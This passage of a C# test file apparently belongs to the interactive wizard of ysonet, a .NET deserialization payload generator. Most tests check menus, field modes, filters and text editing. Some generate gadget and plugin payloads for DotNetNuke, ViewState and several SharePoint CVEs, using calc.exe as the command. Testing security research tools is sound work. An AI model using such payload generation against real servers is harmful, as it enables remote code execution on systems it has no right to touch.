            AssertTrue(FindEditable(vs, "command").Hidden, "dryrun: command hidden");
            AssertTrue(FindEditable(vs, "gadget").Hidden, "dryrun: gadget hidden");
            string dryArgv = string.Join(" ", editor.PluginArgvForTest().ToArray());
            AssertTrue(dryArgv.Contains("--dryrun"), "dryrun argv passes --dryrun: " + dryArgv);
            AssertTrue(!dryArgv.Contains("--command") && !dryArgv.Contains("--gadget"),
                "dryrun argv drops command and gadget: " + dryArgv);

            // A plugin without modes is unaffected: no mode picker.
            var at = new ModuleEditor(null, null, false, null, null).BuildFieldsForTest("ApplicationTrust");
            AssertTrue(FindEditable(at, "mode") == null, "a plugin without modes shows no mode picker");
        }

        private static void DotNetNukeModes()
        {
            var editor = new ModuleEditor(null, null, false, null, null);
            var f = editor.BuildFieldsForTest("DotNetNuke");
            EditableField mode = FindEditable(f, "mode");
            AssertTrue(mode != null && mode.Choices.Count == 3, "three DotNetNuke modes");

            // Default = run_command: command required; url/file hidden.
            AssertTrue(FindEditable(f, "command").Required, "run_command: command required");
            AssertTrue(FindEditable(f, "url").Hidden && FindEditable(f, "file").Hidden, "run_command: url/file hidden");
            FindEditable(f, "command").Value = "calc.exe"; FindEditable(f, "command").Touched = true;
            string a1 = string.Join(" ", editor.PluginArgvForTest().ToArray());
            AssertTrue(a1.Contains("--mode run_command") && a1.Contains("--command"), "run_command argv: " + a1);
            AssertTrue(!a1.Contains("--url") && !a1.Contains("--file"), "run_command argv excludes url/file");
            RunResult r1 = PayloadRunner.RunPlugin("DotNetNuke", editor.PluginArgvForTest().ToArray());
            AssertTrue(r1.Success, "run_command generates via CLI args: " + r1.ErrorMessage);

            // Switch to write_file: file+url required and shown; command hidden.
            mode.Value = mode.Choices[2];
            editor.RefreshDynamicForTest();
            AssertTrue(FindEditable(f, "file").Required && FindEditable(f, "url").Required, "write_file: file+url required");
            AssertTrue(FindEditable(f, "command").Hidden, "write_file: command hidden");
            FindEditable(f, "file").Value = "c:/temp/x.txt"; FindEditable(f, "file").Touched = true;
            FindEditable(f, "url").Value = "http://a/b"; FindEditable(f, "url").Touched = true;
            string a2 = string.Join(" ", editor.PluginArgvForTest().ToArray());
            AssertTrue(a2.Contains("--mode write_file") && a2.Contains("--file") && a2.Contains("--url"), "write_file argv: " + a2);
            AssertTrue(!a2.Contains("--command"), "write_file argv excludes command");
        }

        private static void ClipboardModes()
        {
            var editor = new ModuleEditor(null, null, false, null, null);
            var f = editor.BuildFieldsForTest("Clipboard");
            EditableField mode = FindEditable(f, "mode");
            AssertTrue(mode != null && mode.Choices.Count == 2, "two clipboard modes");

            // Default = winforms: format shown, xamlvariant hidden.
            AssertTrue(!FindEditable(f, "format").Hidden, "winforms: format shown");
            AssertTrue(FindEditable(f, "xamlvariant").Hidden, "winforms: xamlvariant hidden");
            FindEditable(f, "command").Value = "calc.exe"; FindEditable(f, "command").Touched = true;
            string a1 = string.Join(" ", editor.PluginArgvForTest().ToArray());
            AssertTrue(a1.Contains("--mode winforms"), "winforms argv has mode: " + a1);
            AssertTrue(!a1.Contains("--xamlvariant"), "winforms argv excludes xamlvariant");

            // Switch to wpfxaml: xamlvariant shown, format hidden and dropped.
            mode.Value = mode.Choices[1];
            editor.RefreshDynamicForTest();
            AssertTrue(!FindEditable(f, "xamlvariant").Hidden, "wpfxaml: xamlvariant shown");
            AssertTrue(FindEditable(f, "format").Hidden, "wpfxaml: format hidden");
            string a2 = string.Join(" ", editor.PluginArgvForTest().ToArray());
            AssertTrue(a2.Contains("--mode wpfxaml"), "wpfxaml argv has mode: " + a2);
            AssertTrue(!a2.Contains("--format"), "wpfxaml argv excludes format");
        }

        private static void SharePointModes()
        {
            var editor = new ModuleEditor(null, null, false, null, null);
            var f = editor.BuildFieldsForTest("SharePoint");
            EditableField mode = FindEditable(f, "mode");
            AssertTrue(mode != null && mode.Choices.Count == 6, "six SharePoint CVE modes");
            // The CVE selector is the mode picker, not a duplicate 'cve' field.
            AssertTrue(FindEditable(f, "cve") == null, "cve is the mode, not a separate field");

            // Default = CVE-2025-49704: inner 'variant' shown; gadget/useurl hidden.
            AssertTrue(FindEditable(f, "command").Required, "command required");
            AssertTrue(!FindEditable(f, "variant").Hidden, "49704: inner variant shown");
            AssertTrue(FindEditable(f, "gadget").Hidden && FindEditable(f, "useurl").Hidden, "49704: gadget/useurl hidden");
            FindEditable(f, "command").Value = "calc.exe"; FindEditable(f, "command").Touched = true;
            string a1 = string.Join(" ", editor.PluginArgvForTest().ToArray());
            AssertTrue(a1.Contains("--cve CVE-2025-49704"), "49704 argv has cve: " + a1);
            AssertTrue(!a1.Contains("--gadget") && !a1.Contains("--useurl"), "49704 argv excludes gadget/useurl");

            // Switch to CVE-2020-1147: inner 'gadget' shown; it generates via CLI.
            mode.Value = mode.Choices[3];
            editor.RefreshDynamicForTest();
            AssertTrue(!FindEditable(f, "gadget").Hidden, "1147: gadget shown");
            AssertTrue(FindEditable(f, "variant").Hidden, "1147: variant hidden");
            string a2 = string.Join(" ", editor.PluginArgvForTest().ToArray());
            AssertTrue(a2.Contains("--cve CVE-2020-1147") && a2.Contains("--gadget"), "1147 argv: " + a2);
            RunResult r2 = PayloadRunner.RunPlugin("SharePoint", editor.PluginArgvForTest().ToArray());
            AssertTrue(r2.Success, "1147 generates via CLI args: " + r2.ErrorMessage);

            // Switch to CVE-2018-8421: inner 'useurl' shown; it generates via CLI.
            mode.Value = mode.Choices[5];
            editor.RefreshDynamicForTest();
            AssertTrue(!FindEditable(f, "useurl").Hidden, "8421: useurl shown");
            string a3 = string.Join(" ", editor.PluginArgvForTest().ToArray());
            AssertTrue(a3.Contains("--cve CVE-2018-8421"), "8421 argv: " + a3);
            RunResult r3 = PayloadRunner.RunPlugin("SharePoint", editor.PluginArgvForTest().ToArray());
            AssertTrue(r3.Success, "8421 generates via CLI args: " + r3.ErrorMessage);
        }

        private static void BannerShowsBetaAndVersion()
        {
            var keys = new ScriptedKeyReader();
            keys.Escape(); // quit at the top menu after the banner is shown
            string stderr;
            DriveWizard(keys, out stderr);
            AssertTrue(stderr.ToLowerInvariant().Contains("beta"), "banner marks interactive mode as beta");
            string ver = Wizard.ProductVersion();
            AssertTrue(!string.IsNullOrEmpty(ver), "a product version is available");
            AssertTrue(stderr.Contains(ver), "banner shows the product version (" + ver + ")");
        }

        private static void ExplicitEmptyStringViaSpace()
        {
            // viewStateUserKey is the real case: ViewState checks it with != null, so
            // an empty string differs from unset. The space convention must let the
            // user express that and pass it as --viewstateuserkey "".
            var editor = new ModuleEditor(null, null, false, null, null);
            var vs = editor.BuildFieldsForTest("ViewState");
            EditableField k = FindEditable(vs, "viewstateuserkey");
            AssertTrue(k != null, "viewstateuserkey field present");
            AssertTrue(string.IsNullOrEmpty(k.Value) && !k.ExplicitEmpty, "starts unset");

            // Unset is not passed on the command line.
            AssertTrue(!string.Join("|", editor.PluginArgvForTest().ToArray()).Contains("--viewstateuserkey"),
                "unset viewstateuserkey is not passed");

            // One space -> an explicit empty string, shown distinctly and passed as "".
            ModuleEditor.CommitTextForTest(k, " ");
            AssertTrue(k.ExplicitEmpty && k.Value == "", "one space = explicit empty string");
            AssertEqual("(empty string)", k.DisplayValue, "explicit empty shows distinctly (not '(unset)')");
            string argv = string.Join("|", editor.PluginArgvForTest().ToArray());
            AssertTrue(argv.Contains("--viewstateuserkey|"), "explicit empty is passed as --viewstateuserkey \"\": " + argv);

            // Two spaces -> a single real space value; three -> two spaces.
            ModuleEditor.CommitTextForTest(k, "  ");
            AssertTrue(!k.ExplicitEmpty && k.Value == " ", "two spaces = one space value");
            ModuleEditor.CommitTextForTest(k, "   ");
            AssertTrue(!k.ExplicitEmpty && k.Value == "  ", "three spaces = two spaces");

            // Mixed input is taken literally: leading/trailing spaces are NOT trimmed.
            ModuleEditor.CommitTextForTest(k, " abc ");
            AssertTrue(k.Value == " abc " && !k.ExplicitEmpty, "surrounding spaces preserved (not trimmed)");

            // Truly empty input -> unset again (not passed).
            ModuleEditor.CommitTextForTest(k, "");
            AssertTrue(!k.ExplicitEmpty && string.IsNullOrEmpty(k.Value), "empty input -> unset");
            AssertTrue(!string.Join("|", editor.PluginArgvForTest().ToArray()).Contains("--viewstateuserkey"),
                "back to unset is not passed");
        }

        private static void ConditionalRequired()
        {
            // ViewState: the genuinely-required key stays flagged; the conditional
            // ones (mode/encryption/OSF-specific, or optional) do not.
            var vs = new ModuleEditor(null, null, false, null, null).BuildFieldsForTest("ViewState");
            AssertTrue(FindEditable(vs, "validationkey").Required, "validationkey is required");
            AssertTrue(!FindEditable(vs, "decryptionkey").Required, "decryptionkey is conditional (encryption)");
            AssertTrue(!FindEditable(vs, "mackey").Required, "mackey is conditional (osf)");
            AssertTrue(!FindEditable(vs, "path").Required, "path is optional");
            AssertTrue(!FindEditable(vs, "apppath").Required, "apppath is conditional");
            AssertTrue(!FindEditable(vs, "viewstateuserkey").Required, "viewstateuserkey is conditional (sometimes)");

            // Mode-conditional options in other plugins are not required either.
            var dnn = new ModuleEditor(null, null, false, null, null).BuildFieldsForTest("DotNetNuke");
            AssertTrue(!FindEditable(dnn, "file").Required, "DotNetNuke file is mode-conditional");
            AssertTrue(!FindEditable(dnn, "url").Required, "DotNetNuke url is mode-conditional");
        }

        private static void ThemeApply()
        {
            string original = ConsoleStyle.CurrentThemeName;
            try
            {
                AssertTrue(ConsoleStyle.Themes.Length >= 3, "several themes available");
                ConsoleStyle.ApplyTheme("Green");
                AssertEqual("Green", ConsoleStyle.CurrentThemeName, "current theme updated");
                AssertEqual(ConsoleColor.DarkCyan, ConsoleStyle.Accent, "Green theme sets its accent");
                ConsoleStyle.ApplyTheme("Blue");
                AssertEqual(ConsoleColor.Cyan, ConsoleStyle.Accent, "Blue theme sets its accent");
            }
            finally
            {
                ConsoleStyle.ApplyTheme(original);
            }
        }

        private static void WizardBlocksMissingRequired()
        {
            // ObjRef takes a URL (required) and has no default, so Generate with it
            // empty must be blocked with a message - and must NOT drop out of the
            // wizard (the following keys still drive it).
            var keys = new ScriptedKeyReader();
            keys.Enter();                  // top -> gadget
            keys.Type("ObjRef").Enter();   // module picker
            keys.Type("Generate").Enter(); // blocked: URL is required and empty
            keys.Escape();                 // leave form
            keys.Escape();                 // leave module list
            keys.Escape();                 // quit

            string stderr;
            byte[] stdout = DriveWizard(keys, out stderr);

            AssertEqual(0, stdout.Length, "blocked generation emits no payload");
            AssertTrue(stderr.Contains("Not ready to generate"), "a clear not-ready report is shown");
            AssertTrue(stderr.Contains("command") && stderr.Contains("Example:"),
                "the report names the setting and shows an example");
            AssertTrue(stderr.Contains("Bye."), "the wizard is still running (reached the top-menu quit)");
        }

        private static void BlockedReportEnumeratesMissing()
        {
            // A plugin mode that requires several settings lists each missing one by
            // name, so the user fixes them all at once (ViewState 'Exploit' needs a
            // command and a validationkey).
            var ed = new ModuleEditor(null, null, false, null, null);
            ed.BuildFieldsForTest("ViewState");
            List<string> probs = ed.MissingRequiredModeProblemsForTest();
            AssertTrue(probs != null && probs.Count >= 2, "each missing required setting is enumerated");
            bool cmd = false, vk = false;
            foreach (string p in probs)
            {
                if (p.StartsWith("command")) cmd = true;
                if (p.StartsWith("validationkey")) vk = true;
                AssertTrue(p.Contains(":"), "each problem reads 'name: explanation' - " + p);
            }
            AssertTrue(cmd && vk, "both required ViewState settings are named: " + string.Join(" | ", probs.ToArray()));
        }

        private static void BlockedReportShowsCommandExample()
        {
            // A gadget whose -c is a URL (ObjRef) reports the expected input type and a
            // concrete example, not just "a value is missing".
            var ed = new ModuleEditor(null, null, true, null, null);
            ed.BuildFieldsForTest("ObjRef");
            string p = ed.MissingRequiredCommandProblemForTest();
            AssertTrue(p != null, "a missing required command is reported");
            AssertTrue(p.Contains("command") && p.Contains("URL") && p.Contains("Example:") && p.Contains("http"),
                "the command problem names the setting, its type, and a URL example: " + p);
        }

        private static void ColumnsHomeEndNav()
        {
            // End jumps to the last setting (the Reset action, always last).
            var end = DriveFrames(k => k.Enter().Enter().End().Escape().Escape().Escape());
            AssertTrue(AnyFrame(end, "> [ Reset settings to defaults ]"), "End jumps to the last setting");
        }

        private static void PickerHomeEnd()
        {
            // End selects the last match, Home the first (deterministic list).
            var items = new List<string> { "alpha", "bravo", "charlie", "delta" };
            string last = WithSwallowedError(() =>
                new Picker(new ScriptedKeyReader().End().Enter()).Show("pick", items, null));
            AssertEqual("delta", last, "End selects the last item");
            string first = WithSwallowedError(() =>
                new Picker(new ScriptedKeyReader().End().Home().Enter()).Show("pick", items, null));
            AssertEqual("alpha", first, "Home selects the first item");
        }

        private static void WizardGenerateAndQuit()
        {
            // Generate and quit emits the payload and leaves interactive mode; if it
            // did NOT exit, the wizard would ask for more keys and the scripted
            // reader would run dry (throwing), so reaching the asserts proves it left.
            var keys = new ScriptedKeyReader();
            keys.Enter();                            // top -> gadget
            keys.Type("ObjectDataProvider").Enter(); // module picker
            keys.Type("formatter").Enter();          // open formatter
            keys.Digit(2);                           // Json.NET
            keys.Type("Generate and quit").Enter();  // generate + leave

            string stderr;
            byte[] got = DriveWizard(keys, out stderr);

            AssertTrue(BytesEqual(got, GenerateOdpJson("calc.exe")), "the payload was emitted");
            AssertTrue(!stderr.Contains("Bye."), "left via generate-and-quit, not the plain quit");
        }

        private static void ColumnsRenderInVirtualTerminal()
        {
            // Drive the REAL side-by-side columns path (not the fallback) against an
            // in-memory terminal, and assert on what it actually renders. This is the
            // headless stand-in for a real console: it catches layout, column-hiding,
            // and per-cell-highlight regressions.
            var prevTerm = Term.Current;
            bool prevForce = ModuleEditor.ForceFallback;
            var vt = new VirtualTerminal(120, 40);
            Term.Current = vt;
            ModuleEditor.ForceFallback = false; // exercise RunColumns, not the fallback
            try
            {
                var keys = new RecordingKeyReader(vt);
                keys.Enter();       // top menu -> Build a gadget payload
                keys.Enter();       // columns: open the first gadget's settings
                keys.Down().Down(); // move the setting selection
                keys.Escape();      // back to the modules column
                keys.Escape();      // leave the editor -> top menu
                keys.Escape();      // quit

                new Wizard(keys, new MemoryStream()).Run();
                var frames = keys.Frames;
                AssertTrue(frames.Count >= 6, "a frame was captured per keypress");

                // Module-list frame: the settings/editor columns are hidden here; the
                // right side instead shows the highlighted gadget's info panel.
                Frame modules = FindFrame(frames, f => f.Contains("Gadgets") && f.Contains("- Info")
                    && f.Contains("Formatters:") && !f.Contains("[ Generate"));
                AssertTrue(modules != null, "module list shows the info panel, not the settings columns");

                // A three-column settings frame with the action rows.
                Frame settings = FindFrame(frames, f => f.Contains(" | ") && f.Contains("[ Generate and quit ]"));
                AssertTrue(settings != null, "three-column settings view rendered");
                AssertTrue(settings.Contains("command"), "command setting shown");
                AssertTrue(settings.Contains("formatter"), "formatter setting shown");
                AssertTrue(settings.Contains("[ Generate ]") && settings.Contains("[ Show ysonet command ]"), "all actions shown");

                // Per-cell highlight: the selection bar covers only the settings
                // column's current cell, not the whole row (the bug we fixed).
                int barRow = -1;
                for (int y = 0; y < settings.Height && barRow < 0; y++)
                    for (int x = 25; x < settings.Width; x++)
                        if (settings.Bg(x, y) == ConsoleStyle.SelectBg) { barRow = y; break; }
                AssertTrue(barRow >= 0, "a selection bar is drawn in the settings column");
                AssertTrue(settings.Bg(2, barRow) != ConsoleStyle.SelectBg,
                    "the modules column is NOT part of the settings selection bar (per-cell highlight)");
            }
            finally
            {
                Term.Current = prevTerm;
                ModuleEditor.ForceFallback = prevForce;
            }
        }

        private static Frame FindFrame(List<Frame> frames, Func<Frame, bool> pred)
        {
            foreach (Frame f in frames)
                if (pred(f)) return f;
            return null;
        }

        private static void ColumnFilterNarrowsModules()
        {
            // On the gadget module list, typing "Windows" narrows it to the gadgets
            // whose name contains that substring. The active filter is tagged in the
            // header, and a matching gadget is shown.
            var frames = DriveFrames(k => k.Enter()              // build a gadget -> module list
                .Type("Windows")                                 // filter the modules
                .Escape().Escape().Escape());                    // clear filter, leave, quit
            AssertTrue(AnyFrame(frames, "/Windows"), "the active module filter is tagged in the header");
            AssertTrue(AnyFrame(frames, "WindowsIdentity"), "a substring match is shown while filtering");

            // A filter that matches nothing produces a match-free list (no gadget rows),
            // but does not crash the redraw.
            var none = DriveFrames(k => k.Enter().Type("zznomatch").Escape().Escape().Escape());
            AssertTrue(AnyFrame(none, "/zznomatch"), "a no-match filter is still tagged");
        }

        private static void ColumnFilterNarrowsSettings()
        {
            // Inside a gadget's settings, typing "out" narrows the list to the settings
            // whose label contains "out" (output, outputpath).
            var frames = DriveFrames(k => k.Enter().Enter()      // open the first gadget's settings
                .Type("out")                                     // filter the settings
                .Escape().Escape().Escape().Escape());
            AssertTrue(AnyFrame(frames, "/out"), "the active settings filter is tagged in the header");
            AssertTrue(AnyFrame(frames, "outputpath"), "a substring match is shown while filtering settings");
        }

        private static void ModuleInfoPanelShowsFacts()
        {
            // On the gadget module list (before opening one), the right side shows the
            // highlighted gadget's info so a user can choose: its formatters and what
            // the -c command means.
            var gadget = DriveFrames(k => k.Enter().Escape().Escape());
            AssertTrue(AnyFrame(gadget, "- Info"), "the info panel header shows for the highlighted gadget");
            AssertTrue(AnyFrame(gadget, "Formatters:"), "the gadget info lists its formatters");
            AssertTrue(AnyFrame(gadget, "Command input:"), "the gadget info states what the command means");

            // On the plugin module list, the info panel lists the plugin's options.
            var plugin = DriveFrames(k => k.Digit(2).Escape().Escape());
            AssertTrue(AnyFrame(plugin, "- Info"), "the info panel header shows for the highlighted plugin");
            AssertTrue(AnyFrame(plugin, "Options:"), "the plugin info lists its options");
        }

        private static void FilterFieldsUnit()
        {
            var fields = new List<EditableField>
            {
                new EditableField { Label = "command" },
                new EditableField { Label = "output" },
                new EditableField { Label = "outputpath" },
                new EditableField { Label = "formatter" },
            };
            // Empty query is a pass-through (same list instance/contents).
            AssertEqual(4, ModuleEditor.FilterFieldsForTest(fields, "").Count, "empty query keeps all");
            var outp = ModuleEditor.FilterFieldsForTest(fields, "out");
            AssertEqual(2, outp.Count, "two labels contain 'out'");
            AssertEqual("output", outp[0].Label, "order is preserved");
            AssertEqual("outputpath", outp[1].Label, "order is preserved");
            // Case-insensitive substring, not just prefix.
            AssertEqual(1, ModuleEditor.FilterFieldsForTest(fields, "MAND").Count, "case-insensitive substring match");
        }

        private static void SentenceCasingUnit()
        {
            AssertEqual("Hello there", ModuleEditor.SentenceForTest("hello there"), "lower-case first letter is capitalized");
            AssertEqual("Already up", ModuleEditor.SentenceForTest("Already up"), "an already-capital first letter is left alone");
            AssertEqual("'winforms' mode", ModuleEditor.SentenceForTest("'winforms' mode"), "a non-letter start (a quoted token) is left alone");
            AssertEqual("", ModuleEditor.SentenceForTest(""), "empty stays empty");
        }

        // Drive the interactive UI against a fresh virtual terminal (real columns
        // path) and return every rendered frame.
        private static List<Frame> DriveFrames(Action<RecordingKeyReader> build)
        {
            var prevTerm = Term.Current;
            bool prevForce = ModuleEditor.ForceFallback;
            var vt = new VirtualTerminal(120, 40);
            Term.Current = vt;
            ModuleEditor.ForceFallback = false;
            try
            {
                var k = new RecordingKeyReader(vt);
                build(k);
                try { new Wizard(k, new MemoryStream()).Run(); } catch { }
                return k.Frames;
            }
            finally
            {
                Term.Current = prevTerm;
                ModuleEditor.ForceFallback = prevForce;
            }
        }

        private static bool AnyFrame(List<Frame> frames, string needle)
        {
            foreach (Frame f in frames)
                if (f.Contains(needle)) return true;
            return false;
        }

        private static void AllMenusRender()
        {
            AssertTrue(AnyFrame(DriveFrames(k => k.Escape()), "Build a gadget payload"), "top menu renders");
            AssertTrue(AnyFrame(DriveFrames(k => k.Enter().Enter().Escape().Escape().Escape()), "[ Generate and quit ]"), "gadget settings render");
            AssertTrue(AnyFrame(DriveFrames(k => k.Digit(2).Up().Enter().Escape().Escape().Escape()), "ViewState Settings"), "plugin settings render");
            AssertTrue(AnyFrame(DriveFrames(k => k.Digit(3).Type("Json").Enter().Enter().Escape()), "Gadgets with a formatter"), "search formatters renders");
            AssertTrue(AnyFrame(DriveFrames(k => k.Digit(4).Escape().Escape()), "What kind of input"), "run-all-formatters renders");
            AssertTrue(AnyFrame(DriveFrames(k => k.Digit(6).Enter().Escape()), "Pick 'gadget'"), "help renders");
            AssertTrue(AnyFrame(DriveFrames(k => k.Digit(5).Enter().Escape()), "developed and maintained"), "credits render");
            AssertTrue(AnyFrame(DriveFrames(k => k.Digit(7).Down().Escape().Escape()), "Pick a color theme"), "theme picker renders");
        }

        private static void TextEditAppends()
        {
            // Open a gadget, edit the command (a text setting). The box is pre-filled
            // with the current value and the caret sits at the end, so typing APPENDS
            // (it does not wipe the value). (Enter opens the gadget flow, Enter opens
            // the first gadget, Down moves to 'command', Enter edits it.)
            var frames = DriveFrames(k => k.Enter().Type("ObjectDataProvider").Enter().Down().Enter()
                .Type("X").Escape().Escape().Escape().Escape());
            // The full value is echoed in the footer (so a long value stays visible for
            // reading/copying); the edit box itself shows it with a block caret.
            AssertTrue(AnyFrame(frames, "Editing command: calc.exe"), "the box is pre-filled with the current value");
            AssertTrue(AnyFrame(frames, "Editing command: calc.exeX"), "typing appends at the end (does not replace)");

            // Ctrl+U clears the whole line, so you can quickly type a fresh value.
            var replaced = DriveFrames(k => k.Enter().Type("ObjectDataProvider").Enter().Down().Enter()
                .CtrlU().Type("notepad").Escape().Escape().Escape().Escape());
            AssertTrue(AnyFrame(replaced, "Editing command: notepad"), "Ctrl+U clears, then typing sets a new value");

            // Backspacing the value away empties the box (Enter would then save empty).
            var cleared = DriveFrames(k => k.Enter().Type("ObjectDataProvider").Enter().Down().Enter()
                .Backspace(8).Escape().Escape().Escape().Escape()); // "calc.exe" is 8 chars
            AssertTrue(AnyFrameRowTrimmed(cleared, "Editing command:"), "backspacing the value empties the box");
        }

        private static void TextEditWordOps()
        {
            // Ctrl+Backspace deletes the whole word to the left. Type "abc def", then
            // Ctrl+Backspace removes "def" and typing "Z" gives "abc Z" (a sentinel that
            // only arises if the word delete happened). Ctrl+U clears first.
            var del = DriveFrames(k => k.Enter().Type("ObjectDataProvider").Enter().Down().Enter()
                .CtrlU().Type("abc def").CtrlBackspace().Type("Z")
                .Escape().Escape().Escape().Escape());
            AssertTrue(AnyFrame(del, "Editing command: abc Z"), "Ctrl+Backspace deletes the word to the left");

            // Ctrl+Left moves by a word, so typing lands before that word: from the end
            // of "abc def", Ctrl+Left puts the caret before "def"; typing "Z" gives
            // "abc Zdef".
            var move = DriveFrames(k => k.Enter().Type("ObjectDataProvider").Enter().Down().Enter()
                .CtrlU().Type("abc def").CtrlLeft().Type("Z")
                .Escape().Escape().Escape().Escape());
            AssertTrue(AnyFrame(move, "Editing command: abc Zdef"), "Ctrl+Left jumps a whole word");
        }

        private static void TextEditWrapsInPlace()
        {
            // A value longer than the editor column wraps onto the next line in place
            // (no separate page). Type a long no-space value; it appears wrapped in the
            // edit box across more than one row, and in full on one line in the footer.
            string longVal = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaXY";
            var frames = DriveFrames(k => k.Enter().Type("ObjectDataProvider").Enter().Down().Enter()
                .CtrlU().Type(longVal).Escape().Escape().Escape().Escape());
            // The tail "XY" is only reachable if the value wrapped onto a later row of
            // the box (the first row is full of 'a's), so seeing it proves in-place wrap.
            AssertTrue(AnyFrame(frames, "XY"), "a long value wraps onto the next row of the edit box");
        }

        // True when some frame has a row whose trimmed text equals exactly `s`.
        private static bool AnyFrameRowTrimmed(List<Frame> frames, string s)
        {
            foreach (Frame f in frames)
                for (int y = 0; y < f.Height; y++)
                    if (f.Row(y).Trim() == s) return true;
            return false;
        }

        private static void TextEditCaretEditing()
        {
            // Left moves the caret so you can insert in the middle, not only append.
            var mid = DriveFrames(k => k.Enter().Type("ObjectDataProvider").Enter().Down().Enter()
                .Left().Left().Type("X").Escape().Escape().Escape().Escape());
            AssertTrue(AnyFrame(mid, "Editing command: calc.eXxe"), "Left caret then type inserts in the middle");

            // Home jumps to the start; Delete removes the character at the caret.
            var del = DriveFrames(k => k.Enter().Type("ObjectDataProvider").Enter().Down().Enter()
                .Home().Delete().Escape().Escape().Escape().Escape());
            AssertTrue(AnyFrame(del, "Editing command: alc.exe"), "Home then Delete removes the first character");
        }

        private static void FocusedValueInFooter()
        {
            // Navigating onto a value setting shows its full value in the footer, so a
            // long value (truncated in the narrow column) can be read and copied out.
            var frames = DriveFrames(k => k.Enter().Type("ObjectDataProvider").Enter().Down().Escape().Escape().Escape());
            AssertTrue(AnyFrame(frames, "command = calc.exe"), "the focused setting's full value shows in the footer");
        }

        private static void LineEditBufferUnit()
        {
            // Opens pre-filled with the caret at the end, so typing appends.
            var b = new LineEditBuffer("calc.exe");
            AssertEqual(8, b.Caret, "caret starts at the end");
            b.Insert('X');
            AssertEqual("calc.exeX", b.Text, "typing appends at the end");

            // Caret move + insert edits in the middle.
            var e = new LineEditBuffer("abc");
            e.Left();                            // caret to 2
            e.Insert('X');                       // insert before 'c'
            AssertEqual("abXc", e.Text, "Left then insert edits in the middle");
            AssertEqual(3, e.Caret, "caret advances past the inserted character");

            // Home/End + character delete.
            var d = new LineEditBuffer("abc");
            d.Home(); d.Delete();
            AssertEqual("bc", d.Text, "Home then Delete removes the first character");
            d.End(); d.Backspace();
            AssertEqual("b", d.Text, "End then Backspace removes the last character");

            // Clear empties the whole line.
            var cl = new LineEditBuffer("something");
            cl.Clear();
            AssertEqual("", cl.Text, "Clear empties the line");
            AssertEqual(0, cl.Caret, "Clear resets the caret");

            // Word operations treat runs of non-space as words.
            var w = new LineEditBuffer("cmd /c calc"); // caret at end (11)
            w.DeleteWordLeft();
            AssertEqual("cmd /c ", w.Text, "DeleteWordLeft removes the last word");
            var w2 = new LineEditBuffer("cmd /c calc");
            w2.WordLeft();                       // caret before "calc"
            w2.Insert('X');
            AssertEqual("cmd /c Xcalc", w2.Text, "WordLeft jumps a whole word");
            var w3 = new LineEditBuffer("cmd /c calc");
            w3.Home(); w3.DeleteWordRight();
            AssertEqual(" /c calc", w3.Text, "DeleteWordRight removes the word at the caret");

            // Caret clamps at both ends.
            var c = new LineEditBuffer("x");
            c.Left(); c.Left();
            AssertEqual(0, c.Caret, "caret clamps at 0");
            c.Right(); c.Right();
            AssertEqual(1, c.Caret, "caret clamps at length");
        }

        // Dev inspection: walk every interactive menu/screen in the virtual terminal
        // and print a captured frame of each, so a human/AI can eyeball the real UI.
        private static void DumpUi()
        {
            Func<Action<RecordingKeyReader>, List<Frame>> run = build =>
            {
                var vt = new VirtualTerminal(120, 40);
                Term.Current = vt;
                ModuleEditor.ForceFallback = false;
                var k = new RecordingKeyReader(vt);
                build(k);
                try { new Wizard(k, new MemoryStream()).Run(); } catch { }
                return k.Frames;
            };
            Action<string, List<Frame>, string, bool> show = (label, fs, needle, last) =>
            {
                Frame f = null;
                foreach (Frame x in fs) { if (x.Contains(needle)) { f = x; if (!last) break; } }
                Console.WriteLine("\n#################### " + label + " ####################");
                Console.WriteLine(f == null ? "(not captured: '" + needle + "')" : f.Text());
            };

            var top = run(k => k.Escape());
            show("TOP MENU", top, "What do you want to do", false);

            var gadget = run(k => k.Enter().Type("ObjectDataProvider").Enter().Down().Down().Escape().Escape().Escape());
            show("GADGET MODULES (right columns hidden)", gadget, "Gadgets", false);
            show("GADGET SETTINGS (columns)", gadget, "[ Generate and quit ]", false);

            var textEdit = run(k => k.Enter().Type("ObjectDataProvider").Enter().Down().Enter().Type("notepad").Escape().Escape().Escape().Escape());
            show("EDIT A TEXT SETTING (command)", textEdit, "Edit: command", true);

            var choice = run(k => k.Enter().Type("ObjectDataProvider").Enter().Down().Down().Down().Enter().Escape().Escape().Escape().Escape());
            show("EDIT A CHOICE SETTING (formatter)", choice, "Edit: formatter", false);

            var showCmd = run(k => k.Enter().Type("ObjectDataProvider").Enter().Up().Enter().Enter().Escape().Escape().Escape());
            show("SHOW YSONET COMMAND action", showCmd, "Equivalent one-line command", false);

            var gen = run(k => k.Enter().Type("ObjectDataProvider").Enter().Up().Up().Up().Up().Enter().Enter().Escape().Escape().Escape());
            show("GENERATE action output", gen, "Payload (", false);

            var plugin = run(k => k.Digit(2).Up().Enter().Escape().Escape().Escape());
            show("PLUGIN SETTINGS (ViewState)", plugin, "ViewState Settings", false);

            var theme = run(k => k.Digit(7).Down().Down().Escape().Escape());
            show("THEME PICKER (live preview)", theme, "Pick a color theme", false);

            var search = run(k => k.Digit(3).Type("Json").Enter().Enter().Escape());
            show("SEARCH FORMATTERS", search, "Gadgets with a formatter", true);

            var help = run(k => k.Digit(6).Enter().Escape());
            show("HELP", help, "Pick 'gadget'", false);

            var credits = run(k => k.Digit(5).Enter().Escape());
            show("CREDITS", credits, "developed and maintained", false);
        }

        private static void WizardShowCommand()
        {
            // The show-command action prints the equivalent one-liner and generates
            // nothing (no payload on stdout).
            var keys = new ScriptedKeyReader();
            keys.Enter();                            // top -> gadget
            keys.Type("ObjectDataProvider").Enter(); // module picker
            keys.Type("formatter").Enter();          // open formatter
            keys.Digit(2);                           // Json.NET
            keys.Type("Show ysonet").Enter();        // show-command action
            keys.Escape();                           // leave form
            keys.Escape();                           // leave module list
            keys.Escape();                           // quit

            string stderr;
            byte[] stdout = DriveWizard(keys, out stderr);

            AssertEqual(0, stdout.Length, "show-command does not generate a payload");
            AssertTrue(stderr.Contains("Equivalent one-line command"), "prints the command header");
            AssertTrue(stderr.Contains("-g ObjectDataProvider -f Json.NET"), "prints the gadget command line");
        }

        private static void WizardRemembersLastCommand()
        {
            // Build ODP twice in one session. The first flow types "notepad.exe";
            // the second leaves the command at its default, which must be the
            // remembered command from the first flow.
            var keys = new ScriptedKeyReader();
            // flow 1: ODP / Json.NET / "notepad.exe"
            keys.Enter().Type("ObjectDataProvider").Enter();
